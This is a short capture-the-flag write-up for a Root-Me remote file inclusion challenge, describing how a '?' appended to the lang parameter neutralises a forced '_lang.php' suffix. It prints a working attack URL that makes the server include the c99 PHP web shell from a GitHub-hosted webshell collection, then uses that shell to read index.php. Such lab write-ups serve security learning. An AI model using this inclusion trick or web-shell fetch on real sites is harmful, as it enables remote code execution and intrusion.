![GitHub Logo](web_security/root-me/asset/RFI.png)

With an unexpected input, now, we can see the what kind of vulnerability exist in this challenge. But different from LFI, thought source code can be read, there is nothing in. Notice the gived hint,  it points us to read "PHP source code", but as I said, I read the source of two files and find nothing :( ...Hừm.. Wait a minute! there are not all, still have one source file we haven't ever read. Of course, index.php is still there.
Big goal is reading index.php! Big question, rightnow: How?? All user-input file name gonna be added with "_lang.php" (As u can see in picture above). I tried add %00 follow filename but it seem to didn't work. Fortunately, with some help from Mr.Guc, I find out the key, i add "?" follow filename like
http://challenge01.root-me.org/web-serveur/ch13/?lang=https://raw.githubusercontent.com/tennc/webshell/master/web-malware-collection-13-06-2012/PHP/c99.txt?
"?" make the tail ("_lang.php") is treated as parameter. Specialy, in case "allow_url_include" in php.ini is on, we can include remote file and definely, pass a url (with params) into include() is valid.
At last, I used c99 shell to download and read file index.php. You guys totally laught at me because of that solution, It's really "farmer" :v, but i have no choie when don't know how to read that file immediately :)
